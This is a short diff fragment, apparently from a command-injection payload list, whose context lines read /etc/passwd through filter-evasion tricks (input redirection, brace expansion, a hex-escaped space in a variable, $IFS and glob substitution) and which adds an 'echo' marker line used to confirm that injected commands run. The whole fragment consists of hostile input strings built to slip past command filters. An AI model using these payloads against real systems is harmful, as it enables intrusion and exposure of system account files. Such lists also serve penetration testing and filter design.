@@ -34,3 +34,4 @@ cat</etc/passwd
 {cat,/etc/passwd}
 X=$'cat\x20/etc/passwd'&&$X
 cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+echo HXAXEXEXD
